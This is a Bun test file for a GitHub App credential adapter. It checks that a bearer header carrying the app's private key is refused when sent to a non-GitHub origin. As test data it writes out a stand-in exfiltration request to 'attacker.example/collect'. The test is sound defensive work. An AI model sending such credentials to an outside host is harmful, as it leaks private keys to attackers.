import { describe, expect, test } from "bun:test";
import { generateKeyPairSync } from "node:crypto";

import { createGithubAppCredentialFetch, toRequest } from "./github-app-credential-adapter";

const API = "https://api.github.com";

function noContent(): Response {
  return new Response(null, { status: 204 });
}

function appSecret(): string {
  const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  return JSON.stringify({
    appId: "123",
    privateKey: privateKey.export({ type: "pkcs8", format: "pem" }).toString(),
  });
}

describe("GitHub App credential adapter", () => {
  test("never sends GitHub App JSON or its private key to a non-GitHub origin", async () => {
    const secret = appSecret();
    const observed: string[] = [];
    async function observe(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      observed.push(`${request.url}\n${request.headers.get("authorization") ?? ""}`);
      return noContent();
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: observe });

    await expect(adapted("https://attacker.example/collect", {
      headers: { authorization: `Bearer ${secret}` },
    })).rejects.toThrow("non-GitHub origin");
    expect(observed).toEqual([]);
    expect(observed.join("\n")).not.toContain(secret);
    expect(observed.join("\n")).not.toContain("PRIVATE KEY");
  });
});
